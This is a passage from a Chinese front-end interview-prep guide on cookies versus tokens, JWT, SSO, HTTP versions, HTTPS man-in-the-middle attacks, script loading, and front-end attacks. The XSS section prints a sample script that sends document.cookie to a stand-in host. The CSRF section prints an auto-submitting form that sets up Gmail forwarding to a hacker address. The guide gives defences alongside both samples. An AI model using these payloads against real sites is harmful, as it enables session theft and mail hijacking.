    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleY</span><span class="token punctuation">(</span>0.5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">transform-origin</span><span class="token punctuation">:</span> 0 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>如下图，上面是微信 app 的 border ，下面是优化之后的 border ，两者粗细就一致了。</p> <p><img src="/assets/img/border-2.a502ea90.png" alt=""></p> <h3 id="连环问-如果有-border-radius-怎么办"><a href="#连环问-如果有-border-radius-怎么办" class="header-anchor">#</a> 连环问：如果有 <code>border-radius</code> 怎么办</h3> <p>可以使用 <code>box-shadow</code> 设置</p> <ul><li>X 偏移量 <code>0</code></li> <li>Y 偏移量 <code>0</code></li> <li>阴影模糊半径 <code>0</code></li> <li>阴影扩散半径 <code>0.5px</code></li> <li>阴影颜色</li></ul> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">#box2</span> <span class="token punctuation">{</span>
    <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
    <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
    <span class="token comment">/* border: 1px solid #d9d9d9; */</span>
    <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 0.5px #d9d9d9<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="cookie-和-token-区别"><a href="#cookie-和-token-区别" class="header-anchor">#</a> cookie 和 token 区别</h2> <h3 id="题目-3"><a href="#题目-3" class="header-anchor">#</a> 题目</h3> <p>cookie 和 token 有何区别</p> <h3 id="cookie"><a href="#cookie" class="header-anchor">#</a> cookie</h3> <p>http 请求是无状态的，即每次请求之后都会断开链接。<br>
所以，每次请求时，都可以携带一段信息发送到服务端，以表明客户端的用户身份。服务端也也可以通过 <code>set-cookie</code> 向客户端设置 cookie 内容。<br>
由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。</p> <p><img src="/assets/img/cookie.ab9a88f0.png" alt=""></p> <h3 id="cookie-作为本地存储"><a href="#cookie-作为本地存储" class="header-anchor">#</a> cookie 作为本地存储</h3> <p>前些年大家还常用 cookie 作为本地存储，这并不完全合适。<br>
所以后来 html5 增加了 <code>localStorage</code> 和 <code>sessionStorage</code> 作为本地存储。</p> <h3 id="cookie-跨域限制"><a href="#cookie-跨域限制" class="header-anchor">#</a> cookie 跨域限制</h3> <p>浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS <code>document.cookie</code> 获取到其他域名的 cookie 。</p> <p>http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许</p> <ul><li>客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 <code>withCredentials</code></li> <li>服务端：需要配置 header <code>Access-Control-Allow-Credentials</code></li></ul> <h3 id="浏览器禁用第三发-cookie"><a href="#浏览器禁用第三发-cookie" class="header-anchor">#</a> 浏览器禁用第三发 cookie</h3> <p>现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。</p> <p>例如一个电商网站 A 引用了淘宝广告的 js</p> <ul><li>你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息</li> <li>你再次访问淘宝时，淘宝即可获取这个 cookie 内容</li> <li>再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品</li></ul> <h3 id="cookie-和-session"><a href="#cookie-和-session" class="header-anchor">#</a> cookie 和 session</h3> <p>cookie 用途非常广泛，最常见的就是登录。</p> <p>使用 cookie 做登录校验</p> <ul><li>前端输入用户名密码，传给后端</li> <li>后端验证成功，返回信息时 set-cookie</li> <li>接下来所有接口访问，都自动带上 cookie （浏览器的默认行为， http 协议的规定）</li></ul> <p>什么是 session ？</p> <ul><li>cookie 只存储 userId ，不去暴露用户信息</li> <li>用户信息存储在 session 中 —— session 就是服务端的一个 hash 表</li></ul> <h3 id="token"><a href="#token" class="header-anchor">#</a> token</h3> <p>token 和 cookie 一样，也是一段用于客户端身份验证的字符串，随着 http 请求发送</p> <ul><li>cookie 是 http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）</li> <li>token 默认不会在浏览器存储</li> <li>token 没有跨域限制</li></ul> <p>所以，token 很适合做跨域或者第三方的身份验证。</p> <h3 id="token-和-jwt"><a href="#token-和-jwt" class="header-anchor">#</a> token 和 JWT</h3> <p>JWT === JSON Web Token</p> <p>JWT 的过程</p> <ul><li>前端输入用户名密码，传给后端</li> <li>后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的</li> <li>前端获取 token 之后，存储下来</li> <li>以后访问接口，都在 header 中带上这段 token</li></ul> <p><img src="/assets/img/token.947decd6.png" alt=""></p> <h3 id="答案-2"><a href="#答案-2" class="header-anchor">#</a> 答案</h3> <ul><li>cookie：http 规范；有跨域限制；可存储在本地；可配合 session 实现登录</li> <li>token：自定义标准；不在本地存储；无跨域限制；可用于 JWT 登录</li></ul> <h3 id="连环问-session-和-jwt-比较-你更推荐哪个"><a href="#连环问-session-和-jwt-比较-你更推荐哪个" class="header-anchor">#</a> 连环问：session 和 JWT 比较，你更推荐哪个？</h3> <p>Session 优点</p> <ul><li>原理简单，易于学习</li> <li>用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session</li></ul> <p>Session 的缺点</p> <ul><li>占用服务端内存，有硬件成本</li> <li>多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高</li> <li>跨域传递 cookie ，需要特殊配置</li></ul> <p>JWT 的优点</p> <ul><li>不占用服务器内存</li> <li>多进程、多服务器，不受影响</li> <li>不受跨域限制</li></ul> <p>JWT 的缺点</p> <ul><li>无法快速封禁登录的用户</li></ul> <p>总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。</p> <h3 id="连环问-单点登录"><a href="#连环问-单点登录" class="header-anchor">#</a> 连环问：单点登录</h3> <h4 id="基于-cookie"><a href="#基于-cookie" class="header-anchor">#</a> 基于 cookie</h4> <p>简单的，如果业务系统都在同一主域名下，比如 <code>wenku.baidu.com</code> <code>tieba.baidu.com</code> ，就好办了。
可以直接把 cookie domain 设置为主域名 <code>baidu.com</code> ，百度也就是这么干的。</p> <h4 id="sso"><a href="#sso" class="header-anchor">#</a> SSO</h4> <p>复杂一点的，滴滴这么潮的公司，同时拥有 <code>didichuxing.com</code> <code>xiaojukeji.com</code> <code>didiglobal.com</code> 等域名，种 cookie 是完全绕不开的。需要使用 SSO 技术方案</p> <p><img src="/assets/img/sso.5cf0e505.png" alt=""></p> <h4 id="oauth2"><a href="#oauth2" class="header-anchor">#</a> OAuth2</h4> <p>上述 SSO 是 oauth 的实际案例，其他常见的还有微信登录、github 登录等。即，当设计到第三方用户登录校验时，都会使用 OAuth2.0 标准。
流程参考 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="http-和-udp"><a href="#http-和-udp" class="header-anchor">#</a> HTTP 和 UDP</h2> <h3 id="题目-4"><a href="#题目-4" class="header-anchor">#</a> 题目</h3> <p>HTTP 和 UDP 有何区别</p> <h3 id="网络协议"><a href="#网络协议" class="header-anchor">#</a> 网络协议</h3> <p><img src="/assets/img/xieyi.7ce66d7c.png" alt=""></p> <ul><li>HTTP 在应用层，直接被程序使用</li> <li>TCP 和 UDP 在传输层，底层</li></ul> <h3 id="udp-的特点"><a href="#udp-的特点" class="header-anchor">#</a> UDP 的特点</h3> <p>UDP 是一种无连接的、不可靠的传输层协议。而 TCP 需要连接、断开连接，参考“三次握手、四次挥手”。</p> <p>不需要连接，所以 UDP 的效率比 TCP 高。</p> <p>虽然 UDP 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，UDP 一直处于被发展的趋势。</p> <p>例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 UDP 协议。</p> <h3 id="答案-3"><a href="#答案-3" class="header-anchor">#</a> 答案</h3> <ul><li>HTTP 在应用层，而 UDP 和 TCP 在传输层</li> <li>HTTP 是有连接的、可靠的，UDP 是无连接的、不可靠的</li></ul> <h3 id="连环问-http-1-0-1-1-2-0-区别"><a href="#连环问-http-1-0-1-1-2-0-区别" class="header-anchor">#</a> 连环问：http 1.0 1.1 2.0 区别</h3> <p>http 1.0 最基础的 http 协议</p> <p>http 1.1</p> <ul><li>引入更多的缓存策略，如 <code>cache-control</code> <code>E-tag</code></li> <li>长链接，默认开启 <code>Connection: keep-alive</code> ，多次 http 请求减少了 TCP 连接次数</li> <li>断点续传，状态吗 <code>206</code></li> <li>增加新的 method <code>PUT</code> <code>DELETE</code> 等，可以设计 Restful API</li></ul> <p>http2.0</p> <ul><li>header 压缩，以减少体积</li> <li>多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余</li> <li>服务器端推送</li></ul> <h2 id="https-中间人攻击"><a href="#https-中间人攻击" class="header-anchor">#</a> https 中间人攻击</h2> <h3 id="题目-5"><a href="#题目-5" class="header-anchor">#</a> 题目</h3> <p>什么是 https 中间人攻击，如何预防？</p> <h3 id="复习-https-加密原理"><a href="#复习-https-加密原理" class="header-anchor">#</a> 复习：https 加密原理</h3> <p>http 是明文传输，传输的所有内容（如登录的用户名和密码），都会被中间的代理商（无论合法还是非法）获取到。</p> <p>http + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。</p> <p><img src="/assets/img/https.a54fd2d8.png" alt=""></p> <h3 id="中间人攻击"><a href="#中间人攻击" class="header-anchor">#</a> 中间人攻击</h3> <p>中间人攻击，就是黑客劫持网络请求，伪造 CA 证书。</p> <p><img src="/assets/img/zhongjian.716336e0.jpeg" alt=""></p> <p>解决方案：使用浏览器可识别的，正规厂商的证书（如阿里云），慎用免费证书。</p> <p><img src="/assets/img/httpserror.76783f0e.png" alt=""></p> <h2 id="defer-和-async"><a href="#defer-和-async" class="header-anchor">#</a> defer 和 async</h2> <h3 id="题目-6"><a href="#题目-6" class="header-anchor">#</a> 题目</h3> <p><code>&lt;script&gt;</code> 的 defer 和 async 属性有何区别</p> <h3 id="答案-4"><a href="#答案-4" class="header-anchor">#</a> 答案</h3> <ul><li><code>&lt;script src=&quot;xxx.js&quot;&gt;</code> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。</li> <li><code>&lt;script async src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。</li> <li><code>&lt;script defer src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。</li></ul> <p><img src="/assets/img/async-defer.cd3c1d64.png" alt=""></p> <h3 id="连环问-preload-prefetch-dns-prefetch-的区别"><a href="#连环问-preload-prefetch-dns-prefetch-的区别" class="header-anchor">#</a> 连环问：preload prefetch dns-prefetch 的区别</h3> <ul><li>preload 表示资源在当前页面使用，浏览器会<strong>优先</strong>加载</li> <li>prefetch 表示资源可能在<strong>未来的页面</strong>（如通过链接打开下一个页面）使用，浏览器将在<strong>空闲时</strong>加载</li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>JS and CSS preload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- preload --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- prefetch --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>other.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 css --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 js --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h3 id="连环问-dns-prefetch-和-preconnect-有什么作用"><a href="#连环问-dns-prefetch-和-preconnect-有什么作用" class="header-anchor">#</a> 连环问：dns-prefetch 和 preconnect 有什么作用？</h3> <p>一个 http 请求，第一步就是 DNS 解析得到 IP ，然后进行 TCP 连接。连接成功后再发送请求。</p> <p>dns-prefetch 即 DNS 预获取，preconnect 即预连接。<br>
当网页请求<strong>第三方</strong>资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dns-prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preconnect<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span> <span class="token attr-name">crossorigin</span><span class="token punctuation">&gt;</span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="前端攻击"><a href="#前端攻击" class="header-anchor">#</a> 前端攻击</h2> <h3 id="题目-7"><a href="#题目-7" class="header-anchor">#</a> 题目</h3> <p>你所了解的前端攻击手段有哪些，该如何预防？</p> <h3 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h3> <p>Cross Site Scripting 跨站脚本攻击</p> <p>用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br>
该内容再显示时，这些代码也将会被执行，形成了攻击效果。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- 例如用户提交的内容中有： --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>
    img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://xxx.com/api/xxx?userInfo='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie <span class="token comment">// 将 cookie 提交到自己的服务器</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>最简单的解决方式：替换特殊字符</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> newStr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>也可以使用第三方工具，例如</p> <ul><li>https://www.npmjs.com/package/xss</li> <li>https://www.npmjs.com/package/escape-html</li></ul> <p>现代框架默认会屏蔽 XSS 攻击，除非自己手动开启</p> <ul><li>Vue <code>v-html</code></li> <li>React <code>dangerouslySetInnerHTML</code></li></ul> <h3 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h3> <p>Cross-site request forgery 跨站请求伪造</p> <p>请看下面的故事</p> <ul><li>小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”</li> <li>小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了</li></ul> <p>但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 <code>hacker@hackermail.com</code> 。<br>
因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_emc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hacker@hakermail.com<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
    .....
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>irf<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>on<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>nvp_bu_cftb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Create Filter<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> 
    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// PS：有些是 post 请求，有些是 get 请求</span>
    <span class="token comment">//     get 请求如果用 img.src 还可以规避跨域，更加危险</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>邮件经常用来接收验证码，这是很危险的事情。<br>
当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。</p> <p>CSRF 的过程</p> <ul><li>用户登录了 <code>a.com</code> ，有了 cookie</li> <li>黑客引诱用户访问 <code>b.com</code> 网页，并在其中发起一个跨站请求 <code>a.com/api/xxx</code></li> <li><code>a.com</code> API 收到 cookie ，误以为是真实用户的请求，就受理了</li></ul> <p>CSRF 的预防</p> <ul><li>严格的跨域请求限制</li> <li>为 cookie 设置 <code>SameSite</code> 不随跨域请求被发送 <code>Set-Cookie: key1=val1; key2=val2; SameSite=Strict;</code></li> <li>关键接口使用短信验证码等双重验证</li></ul> <h3 id="点击劫持-clickjacking"><a href="#点击劫持-clickjacking" class="header-anchor">#</a> 点击劫持 Clickjacking</h3> <p>小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br>
这可以是关注，也可以是付款转账等其他危险操作。</p> <p><img src="/assets/img/xiechi.10048af4.png" alt=""></p> <p>点击劫持的原理：黑客在自己的网站，使用隐藏的 <code>&lt;iframe&gt;</code> 嵌入其他网页，诱导用户按顺序点击。</p> <p>使用 JS 预防</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname <span class="token operator">!==</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;您正在访问不安全的页面，即将跳转到安全页面！&quot;</span><span class="token punctuation">)</span>
    top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
<span class="token punctuation">}</span>
